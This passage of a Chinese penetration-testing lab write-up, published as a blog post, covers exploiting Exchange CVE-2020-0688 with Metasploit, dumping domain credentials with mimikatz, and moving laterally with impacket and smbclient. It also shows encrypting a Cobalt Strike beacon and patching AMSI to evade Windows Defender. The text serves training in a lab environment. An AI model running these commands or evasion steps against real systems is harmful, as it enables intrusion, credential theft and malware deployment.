+<td>dbadmin</td>
+<td>用户 + SQL 服务账户</td>
+<td>🔴 极高（立刻可打）</td>
+</tr>
+<tr>
+<td>SRV-WEB-KIT</td>
+<td>Web + WinRM</td>
+<td>🟡 横向入口</td>
+</tr>
+<tr>
+<td>PC-*-KIT</td>
+<td>普通工作站</td>
+<td>🟢 凭据回收站</td>
+</tr>
+<tr>
+<td>DF</td>
+<td>未知主机</td>
+<td>🟡 待探测</td>
+</tr>
+</tbody></table>
+</blockquote>
+<hr>
+<h2 id="七、打-Exchange：CVE-2020-0688"><a href="#七、打-Exchange：CVE-2020-0688" class="headerlink" title="七、打 Exchange：CVE-2020-0688"></a>七、打 Exchange：CVE-2020-0688</h2><h3 id="OWA-登录验证"><a href="#OWA-登录验证" class="headerlink" title="OWA 登录验证"></a>OWA 登录验证</h3><p>确认 DC 的 IP：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shell ping OWA2013</span><br><span class="line"><span class="comment"># 来自 192.168.3.144 的回复: 字节=32 时间&lt;1ms TTL=128</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260508_163232_1lxs.png"></p>
+<p>通过 SOCKS 代理，配置浏览器插件，访问 <code>192.168.3.144</code>：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260508_163232_93tj.png"></p>
+<p>用 <code>rootkit\dbadmin / admin!@#45</code> 登录成功：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260508_163232_dfix.png"></p>
+<h3 id="CVE-2020-0688-漏洞利用"><a href="#CVE-2020-0688-漏洞利用" class="headerlink" title="CVE-2020-0688 漏洞利用"></a>CVE-2020-0688 漏洞利用</h3><p>扫描结果里主机名叫 OWA2013，说明是 Exchange 2013。CVE-2020-0688 正好是 Exchange 2013&#x2F;2016&#x2F;2019 的高危 RCE 漏洞，影响范围广。</p>
+<p>先尝试 MSF 打：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search CVE-2020-0688</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260508_163232_xw90.png"></p>
+<p>找到了一个模块。<code>use 0</code> 进入，<code>show options</code> 看参数：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260508_163232_9e19.png"></p>
+<p>需要配置：</p>
+<ul>
+<li><code>RHOSTS</code> → <code>192.168.3.144</code></li>
+<li><code>USERNAME</code> → <code>rootkit\dbadmin</code></li>
+<li><code>PASSWORD</code> → <code>admin!@#45</code></li>
+<li><code>DOMAIN</code> → <code>rootkit.org</code></li>
+</ul>
+<p>但有个问题，MSF 不能直接连 <code>192.168.3.144</code>，socks 代理也有点问题，所以决定用 CS 转 MSF 的方式处理路由。</p>
+<p><strong>CS 派生会话给 MSF：</strong></p>
+<p>在 CS 里建立一个派生监听器，IP 选目标主机能够回连到 Kali 的网段 IP（<code>192.168.93.129</code>）：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260508_163232_0rae.png"></p>
+<p>MSF 开监听接收：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="built_in">set</span> payload windows/meterpreter/reverse_http</span><br><span class="line"><span class="built_in">set</span> LHOST 192.168.93.129</span><br><span class="line"><span class="built_in">set</span> LPORT 4444</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p>CS 里执行 <code>spawn msf</code> 派生：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260508_163232_obvy.png"></p>
+<p>添加路由：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">run post/multi/manage/autoroute</span><br><span class="line">background</span><br></pre></td></tr></table></figure>
+
+<p>然后打 CVE-2020-0688，结果利用失败，卡在获取 ViewState 页面：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260508_163232_xpqu.png"></p>
+<p>说明 MSF 的请求还是到不了 <code>192.168.3.144</code>。于是去网上下了一个 Python 版的 exp：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains python3 cve-2020-0688.py -s https://192.168.3.144/owa/ -u <span class="string">&#x27;rootkit.org\dbadmin&#x27;</span> -p <span class="string">&#x27;admin!@#45&#x27;</span> -c <span class="string">&quot;whoami&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260508_163232_f76g.png"></p>
+<p>还是不行，卡在 <code>ASP.NET_SessionId</code> 获取阶段。怀疑是靶机问题，重启了一下，确实通了：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260508_163232_pnmu.png"></p>
+<p>按照步骤生成反序列化数据：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260508_163232_0coq.png"></p>
+<p>但是返回 500。试了几次都不行。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260508_163232_ztsq.png"></p>
+<p>然后就是各种排查：排除了防火墙，排除了通讯问题。又发现新问题——SSL 证书太老了，浏览器访问不了，换火狐浏览器解决了，但 exp 本身有问题。</p>
+<p>各种 payload 问题折腾了一圈……</p>
+<p>最终发现 MSF 内置的模块可以打通，思路是：先 CS &gt;&gt; MSF 建路由，再用 MSF 的 exchange 模块打。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260508_163232_ca46.png"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># CS 转 MSF</span></span><br><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="built_in">set</span> payload windows/meterpreter/reverse_http</span><br><span class="line"><span class="built_in">set</span> LHOST 192.168.93.129</span><br><span class="line"><span class="built_in">set</span> LPORT 4444</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 获得 session 1，添加路由</span></span><br><span class="line">run post/multi/manage/autoroute</span><br><span class="line">background</span><br><span class="line"></span><br><span class="line"><span class="comment"># 打 Exchange</span></span><br><span class="line">use exploit/windows/http/exchange_ecp_viewstate</span><br><span class="line"><span class="built_in">set</span> target 1</span><br><span class="line"><span class="built_in">set</span> payload windows/x64/meterpreter/bind_tcp</span><br><span class="line"><span class="built_in">set</span> RHOSTS 192.168.3.144</span><br><span class="line"><span class="built_in">set</span> USERNAME micle</span><br><span class="line"><span class="built_in">set</span> PASSWORD Admin12345</span><br><span class="line"><span class="built_in">set</span> DOMAIN rootkit.org</span><br><span class="line"><span class="built_in">set</span> SSL <span class="literal">true</span></span><br><span class="line"><span class="built_in">set</span> RPORT 443</span><br><span class="line"><span class="built_in">set</span> LPORT 9999</span><br><span class="line"><span class="built_in">set</span> CMDSTAGER::FLAVOR certutil</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260508_163232_ewrt.png"></p>
+<p>太折磨了，但最终还是打通了。</p>
+<h3 id="抓凭据"><a href="#抓凭据" class="headerlink" title="抓凭据"></a>抓凭据</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">load kiwi</span><br><span class="line">creds_all</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260508_163232_gdun.png"><br><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260508_163232_xyel.png"></p>
+<blockquote>
+<p><code>load kiwi</code> 是在 meterpreter 里加载 mimikatz 模块，kiwi 就是 mimikatz 的 MSF 版本。<br><code>creds_all</code> 抓取当前机器上所有凭据，包括明文密码、NTLM hash、Kerberos 票据。</p>
+</blockquote>
+<p>整理有价值的凭据：</p>
+<p><strong>明文密码（最有用）：</strong></p>
+<ul>
+<li><code>Administrator : admin!@#45</code> → <strong>域管理员！</strong></li>
+<li><code>micle : Admin12345</code> → 普通域用户</li>
+<li><code>dbadmin : admin!@#45</code> → 之前已知</li>
+</ul>
+<p><strong>NTLM Hash（有明文了用处不大，但留着）：</strong></p>
+<ul>
+<li><code>Administrator : 518b98ad4178a53695dc997aa02d455c</code></li>
+<li><code>micle : ccef208c6485269c20db2cad21734fe7</code></li>
+</ul>
+<blockquote>
+<p><strong>各种 hash 格式说明：</strong></p>
+<ul>
+<li><code>LM</code>：老旧的 Windows 密码 hash，Vista 之后基本废弃，很容易破解</li>
+<li><code>NTLM</code>：现在 Windows 主流的密码 hash 格式，PTH（哈希传递攻击）用的就是这个</li>
+<li><code>SHA1</code>：密码的 SHA1 哈希，Kerberos 相关</li>
+<li><code>wdigest</code>：Win10 之前默认会在内存里保存明文密码，所以能抓到 <code>Administrator: admin!@#45</code>，Win10 之后微软默认关闭了</li>
+<li><code>tspkg</code>：远程桌面（RDP）相关的凭据存储，也可能包含明文密码</li>
+<li><code>kerberos</code>：Kerberos 认证协议的凭据，包含域内票据，PTT（票据传递攻击）用的就是这里的票据</li>
+</ul>
+<p><strong>一句话总结：</strong> wdigest 和 tspkg 是明文密码的来源，NTLM 是 PTH 的来源，kerberos 是 PTT 的来源。</p>
+</blockquote>
+<hr>
+<h2 id="八、横向到-DF：免杀-AMSI-绕过"><a href="#八、横向到-DF：免杀-AMSI-绕过" class="headerlink" title="八、横向到 DF：免杀 + AMSI 绕过"></a>八、横向到 DF：免杀 + AMSI 绕过</h2><h3 id="确认-DF-机器"><a href="#确认-DF-机器" class="headerlink" title="确认 DF 机器"></a>确认 DF 机器</h3><p>DF 的 IP 之前是 <code>192.168.3.74</code>，这里 IP 变了变成了 <code>192.168.3.131</code>（靶机重启后 DHCP 重新分配了）。之前 fscan 扫描结果显示：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">192.168.3.131:445 (platform: 500 version: 10.0 name: DF domain: ROOTKIT)</span><br></pre></td></tr></table></figure>
+
+<p>配置好 SOCKS 代理，用 crackmapexec 验证凭据：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crackmapexec smb 192.168.3.74 -u administrator micle dbadmin -p <span class="string">&#x27;admin!@#45&#x27;</span> <span class="string">&#x27;Admin12345&#x27;</span> <span class="string">&#x27;admin!@#45&#x27;</span> -d rootkit.org</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>域管理员账号（Administrator）可以登录域内所有机器，有管理员权限；</p>
+<p>普通域用户（micle、dbadmin）只能登录自己有权限的机器。</p>
+</blockquote>
+<p>利用账号密码尝试正向上线 CS：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260508_163232_n56u.png"></p>
+<p>上线失败：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260508_163232_gt2w.png"></p>
+<p>错误 225 是 <code>ERROR_EXE_MACHINE_TYPE_MISMATCH</code> 或者被安全软件拦截。结合拓扑图里 DF 旁边有 Windows Defender 图标，基本可以确定是 Defender 把 payload 杀了。</p>
+<h3 id="WMIEXEC-PSEXEC-验证可通"><a href="#WMIEXEC-PSEXEC-验证可通" class="headerlink" title="WMIEXEC &#x2F; PSEXEC 验证可通"></a>WMIEXEC &#x2F; PSEXEC 验证可通</h3><p>先用 Kali 里的 impacket 组件测试，发现可以拿到 shell：</p>
+<p><strong>WMIEXEC（真正无文件执行）：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">proxychains python3 /usr/share/doc/python3-impacket/examples/wmiexec.py \</span><br><span class="line">rootkit.org/administrator:<span class="string">&#x27;admin!@#45&#x27;</span>@192.168.3.131</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260508_163232_fpiw.png"></p>
+<p><strong>PSEXEC（会上传 exe）：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">proxychains python3 /usr/share/doc/python3-impacket/examples/psexec.py \</span><br><span class="line">rootkit.org/administrator:<span class="string">&#x27;admin!@#45&#x27;</span>@192.168.3.131</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260508_163232_nitm.png"></p>
+<p>权限略有不同，wmiexec 是 administrator，psexec 是 SYSTEM。</p>
+<blockquote>
+<p><strong>psexec 真实原理：</strong></p>
+<ul>
+<li>通过 SMB 上传一个 exe 到目标机器</li>
+<li>创建服务执行这个 exe</li>
+<li>exe 执行完返回 shell</li>
+</ul>
+<p>所以 psexec 确实会上传 exe，不是纯命令执行。</p>
+<p><strong>为什么 impacket 的 psexec 没被 Defender 拦？</strong><br>可能是这个版本的 Windows 10（10240）比较老，Defender 特征库不够新；也可能是 impacket 上传的 exe 特征码恰好不在库里。</p>
+<p><strong>wmiexec 才是真正无文件的：</strong> 完全通过 WMI 接口执行命令，不上传任何文件，所以不会被 Defender 扫描到。</p>
+<p><strong>如果要用 CS 上线，思路就是：</strong><br><code>SMB/WMI协议 → 执行命令 → 下载/上传免杀payload → 执行免杀payload → 上线CS</code></p>
+</blockquote>
+<h3 id="上传-PS1-后门"><a href="#上传-PS1-后门" class="headerlink" title="上传 PS1 后门"></a>上传 PS1 后门</h3><p>先在 CS 里生成一个正向监听器的 PS1 后门文件（beacon.ps1）：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260508_163232_lzax.png"></p>
+<p><strong>方法一：用 smbclient 直接上传</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">proxychains smbclient //192.168.3.131/C$ \</span><br><span class="line">-U <span class="string">&#x27;rootkit.org/administrator%admin!@#45&#x27;</span> \</span><br><span class="line">-c <span class="string">&quot;put /home/kali/beacon.ps1 beacon.ps1&quot;</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<ul>
+<li><code>smbclient</code>：Linux 下的 SMB 客户端工具</li>
+<li><code>//192.168.3.131/C$</code>：连接目标机器的 C 盘管理共享</li>
+<li><code>-U &#39;rootkit.org/administrator%admin!@#45&#39;</code>：格式是 <code>域/用户名%密码</code></li>
+<li><code>-c &quot;put 本地路径 远程文件名&quot;</code>：上传文件</li>
+</ul>
+</blockquote>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260508_163232_hzzi.png"></p>
+<p>文件刚上传上去就直接被检测杀了。</p>
+<p><strong>方法二：通过 CS 的共享目录上传</strong></p>
+<p>先用 CS 的 <code>upload</code> 命令把文件上传到 SRV-WEB-KIT：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">upload D:\Backup\桌面\beacon.ps1</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>注意：不能上传到指定路径，用 <code>shell cd</code> 看当前路径，用 <code>shell dir C:\</code> 确认文件在 C 盘根目录。</p>
+</blockquote>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260508_163232_6xtc.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260508_163232_kq05.png"></p>
+<p>然后用 <code>make_token</code> 伪造域管理员令牌，通过共享目录复制到 DF：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">make_token ROOTKIT\Administrator admin!@#45</span><br><span class="line"><span class="built_in">ls</span> \\192.168.3.131\C$</span><br><span class="line"><span class="comment"># 或者</span></span><br><span class="line">shell <span class="built_in">dir</span> \\192.168.3.131\C$</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260508_163232_3cdp.png"></p>
+<blockquote>
+<p><strong>make_token 原理：</strong></p>
+<p>Windows 里每个进程都有一个令牌（Token），代表当前用户的身份和权限。<br><code>make_token ROOTKIT\Administrator admin!@#45</code> 的意思是：用管理员账密创建一个新的访问令牌，之后所有网络请求都用这个令牌发出去，相当于冒充域管理员访问网络资源。</p>
+<p>用完之后可以用 <code>rev2self</code> 恢复原来的身份。</p>
+</blockquote>
+<p>通过共享目录上传文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell copy C:\beacon.ps1 \\192.168.3.131\C$\beacon.ps1</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260508_163232_eh8g.png"></p>
+<p>上传成功，但还是被检测扫了。</p>
+<blockquote>
+<p><strong>Windows 共享补充说明：</strong></p>
+<ul>
+<li><strong>为什么能共享？</strong> Windows 有 SMB 协议，C$  ,  ADMIN$ 是 Windows 自动创建的隐藏管理共享，只有管理员能访问。</li>
+<li><strong>能做什么？</strong><ul>
+<li>查看文件 ✓ → <code>dir \\192.168.3.131\C$</code></li>
+<li>上传文件 ✓ → <code>copy 本地 \\192.168.3.131\C$\</code></li>
+<li>下载文件 ✓ → <code>copy \\192.168.3.131\C$\文件 本地</code></li>
+<li>删除文件 ✓ → <code>del \\192.168.3.131\C$\文件</code></li>
+<li><strong>直接运行文件 ✗</strong> → 不能，只是文件系统访问，需要用 wmiexec&#x2F;psexec 触发执行</li>
+</ul>
+</li>
+<li><strong>获得域管理员权限</strong>：<ol>
+<li><strong>伪造令牌（make_token）</strong>：已经知道域管理员的账号密码，用make_token临时冒充域管理员身份，不需要真正登录，只是网络请求时用这个身份</li>
+<li><strong>拿下DC</strong>：直接在DC上执行命令，DC是域管理员权限，从DC上发出的操作天然就是最高权限</li>
+</ol>
+</li>
+</ul>
+</blockquote>
+<h3 id="AES-加密免杀"><a href="#AES-加密免杀" class="headerlink" title="AES 加密免杀"></a>AES 加密免杀</h3><p>静态检测过不了，试试加密混淆。用 AES-Encoder 对 PS1 做加密：</p>
+<p>项目地址：<a target="_blank" rel="noopener" href="https://github.com/Chainski/AES-Encoder">https://github.com/Chainski/AES-Encoder</a></p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Import-Module</span> .\AES<span class="literal">-Encoder</span>.ps1</span><br><span class="line"><span class="built_in">Invoke-AES</span><span class="literal">-Encoder</span> <span class="literal">-InFile</span> .\beacon.ps1 <span class="literal">-OutFile</span> beacon_aes.ps1 <span class="literal">-Iterations</span> <span class="number">3</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260508_163232_weuw.png"></p>
+<p>上传到 C 盘：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">proxychains smbclient //192.168.3.131/C$ \</span><br><span class="line">-U <span class="string">&#x27;rootkit.org/administrator%admin!@#45&#x27;</span> \</span><br><span class="line">-c <span class="string">&quot;put /home/kali/enc3_beacon.ps1 enc3_beacon.ps1&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260508_163232_f5mc.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260508_163232_s0g2.png"></p>
+<p>3 次加密后，静态检测过了，Defender 没有报警。</p>
+<h3 id="AMSI-绕过"><a href="#AMSI-绕过" class="headerlink" title="AMSI 绕过"></a>AMSI 绕过</h3><p>但是运行的时候还是被检测到，不能正常上线：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260508_163232_kp7s.png"></p>
+<p>这是被 AMSI 检测了，静态过了但动态没过。</p>
+<blockquote>
+<p><strong>什么是 AMSI？</strong></p>
+<p>AMSI（Antimalware Scan Interface，反恶意软件扫描接口），是微软 Windows 10&#x2F;11 和 Windows Server 2016+ 自带的安全机制。</p>
+<p><strong>AMSI 能检测什么？</strong></p>
+<ul>
+<li>PowerShell 脚本中的恶意命令</li>
+<li>内存中的恶意代码（无文件攻击）</li>
+<li>混淆过的恶意脚本</li>
+<li>各种 payload（如 Mimikatz、CS 生成的 shellcode）</li>
+</ul>
+<p>简单来说：静态检测是文件落地时扫的，AMSI 是<strong>脚本运行时</strong>动态扫的，所以加密过了文件扫不出来，但一运行脚本就被 AMSI 抓了。</p>
+</blockquote>
+<p>经过多次尝试，发现利用项目里自带的 <code>amsi_patch.ps1</code> 可以绕过：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 通过内存补丁，让 AMSI 功能失效</span></span><br><span class="line"><span class="variable">$amsi</span> = [<span class="type">Ref</span>].Assembly.GetType(...)</span><br><span class="line"><span class="comment"># 修改 AMSI 的内存地址，使其无法工作</span></span><br></pre></td></tr></table></figure>
+
+<p>运行 <code>amsi_patch.ps1</code> 之后，AMSI 暂时失效，加密后门就能正常运行了。</p>
+<p><strong>先用 wmiexec 拿到命令终端：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">proxychains python3 /usr/share/doc/python3-impacket/examples/wmiexec.py \</span><br><span class="line">rootkit.org/administrator:<span class="string">&#x27;admin!@#45&#x27;</span>@192.168.3.131</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260508_163232_cjne.png"></p>
+<p><strong>运行脚本：</strong></p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell <span class="literal">-ExecutionPolicy</span> bypass <span class="operator">-File</span> amsi_enc6_beacon.ps1</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p><code>-ExecutionPolicy Bypass</code> 是用来绕过 PowerShell 自身的执行策略限制的。不加这个参数的话，直接运行脚本会有权限提示，无法执行。</p>
+</blockquote>
+<p>不加参数会检测，加了才能直接执行：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260508_163232_ywrh.png"></p>
+<p>成功运行：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260508_163232_10yi.png"></p>
+<p>验证监听端口是否开放：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -ano | findstr 8896</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260508_163232_5ojq.png"></p>
+<p>因为是正向监听器，需要 cs 主动连过去：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">connect 192.168.3.131 8896</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260508_163232_meci.png"></p>
+<p>DF 成功上线！</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260508_163232_1vba.png"></p>
+<hr>
+<h2 id="九、总结"><a href="#九、总结" class="headerlink" title="九、总结"></a>九、总结</h2><p>这次打了一条比较完整的内网渗透链路，整体下来踩了不少坑，记录一下几个比较重要的点：</p>
+<p><strong>整体攻击路径：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">外网 Kali</span><br><span class="line">  → Redis 未授权 + SSH公钥写入</span><br><span class="line">  → Web1（192.168.1.128，外网 Linux）</span><br><span class="line">  → arp 缓存发现 + bash_history 找 SSH 命令</span><br><span class="line">  → Web2（192.168.52.20，内网 Linux）</span><br><span class="line">  → fscan 扫 93 网段</span><br><span class="line">  → MSF 多层路由代理</span><br><span class="line">  → OA 系统源码泄漏 → MSSQL sa 凭据</span><br><span class="line">  → xp_cmdshell → CS 上线 SRV-WEB-KIT（192.168.93.128）</span><br><span class="line">  → 提权 + 域内信息收集 + SPN 枚举</span><br><span class="line">  → Exchange CVE-2020-0688 RCE</span><br><span class="line">  → Mimikatz 抓域管密码</span><br><span class="line">  → WMIEXEC + AES 加密 + AMSI 绕过</span><br><span class="line">  → DF（192.168.3.131）上线</span><br></pre></td></tr></table></figure>
+
+<p><strong>几个踩坑记录：</strong></p>
+<ol>
+<li>**Redis 公钥前后要加 <code>\n\n</code>**，不然 SSH 解析失败，这个细节容易忘。</li>
+<li><strong>内网机器没有 nmap 时</strong>，优先翻 <code>arp -a</code> 和 <code>~/.bash_history</code>，往往有意外收获。</li>
+<li><strong>fscan 扫不到目标时</strong>，可能是对方防火墙屏蔽了 ICMP（ping），加 <code>-t</code> 参数跳过 ICMP 直接扫端口 , 可能是自己靶机问题。</li>
+<li><strong>Exchange CVE-2020-0688 很折腾</strong>，exp 要选对，SSL 证书问题可以换火狐绕过，最后用 MSF 内置模块成功了, 其实还是环境问题。</li>
+<li><strong>DF 有 Defender，直接上传 payload 必死</strong>。思路是：先 AES 加密绕过静态检测，再用 amsi_patch.ps1 绕过 AMSI 的动态检测，然后才能正常上线。</li>
+<li><strong>正向 vs 反向监听器</strong>：内网机器有防火墙或者回连路径复杂时，正向监听（bind_tcp）往往更简单，由 Kali 主动去连。</li>
+</ol>
+</article>
+<div class="article-footer slide-up">
+    <section id="license">
+      <div class="header"><span>许可协议</span></div>
+      <div class="body"><p>本文采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议，转载请注明出处。</p>
+</div>
+    </section>
+    
+
+</div>
+
+
+
+
+
+
+<footer class="page-footer slide-up footnote"><div class="welcome-text" style="text-align: center; padding: 10px 0; font-size: 14px; color: #fff;">欢迎入侵本站</div><div class="text"></div></footer>
+<div class="main-mask" onclick="sidebar.dismiss()"></div></div><aside class="l_right"><div class="sidebg"></div><div class="rightbar-container">
+<div class="rightbar-top-btn">
+  <a class="top" onclick="util.scrollTop()">
+    <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="1.5"><path stroke-linejoin="round" d="m9 15.5l3-3l3 3m-6-4l3-3l3 3"/><path d="M7 3.338A9.95 9.95 0 0 1 12 2c5.523 0 10 4.477 10 10s-4.477 10-10 10S2 17.523 2 12c0-1.821.487-3.53 1.338-5"/></g></svg>
+    <span>回到顶部</span>
+  </a>
+</div>
+<div class="widgets">
+
+<widget class="widget-wrapper slide-up toc" id="data-toc" collapse="false"><div class="widget-header dis-select" onclick="sidebar.toggleTOC()"><span class="name">本文目录</span></div><div class="widget-body"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%B0%8F%E8%BF%AAVPC3%E5%86%85%E7%BD%91%E6%89%93%E9%9D%B6%E5%85%A8%E6%B5%81%E7%A8%8B%E8%AE%B0%E5%BD%95"><span class="toc-text">小迪VPC3内网打靶全流程记录</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9B%AE%E5%BD%95"><span class="toc-text">目录</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE"><span class="toc-text">一、环境配置</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" 